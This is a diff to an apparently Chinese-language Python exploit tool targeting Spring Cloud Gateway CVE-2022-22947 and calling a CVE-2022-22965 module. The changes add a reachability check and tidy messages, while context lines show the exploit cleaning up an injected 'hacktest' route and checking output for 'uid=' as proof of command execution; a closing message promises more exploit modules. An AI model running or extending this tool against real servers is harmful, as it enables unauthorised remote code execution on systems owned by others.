@@ -78,11 +78,11 @@ def CVE_2022_22947(url):
     re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
     re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
     if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
-        cprint("[+]Payload已经输出，回显结果如下：", "red")
+        cprint("[+] Payload已经输出，回显结果如下：", "red")
         print('\n')
         print(re3.text)
     else:
-        cprint("[-]CVE-2022-22947漏洞不存在", "yellow")
+        cprint("[-] CVE-2022-22947漏洞不存在", "yellow")
         print('\n')
 
 def vul(url):
@@ -90,6 +90,15 @@ def vul(url):
         url = str("http://") + str(url)
     if str(url[-1]) != "/":
         url = url + "/"
+    try:
+        requests.packages.urllib3.disable_warnings()
+        r = requests.get(url, timeout=6, verify=False)  # 设置超时6秒
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except:
+        cprint("[-] URL为 " + url + " 的目标积极拒绝请求，予以跳过！", "magenta")
+        sys.exit()
     CVE_2022_22947(url)
     CVE_2022_22965(url)
     cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
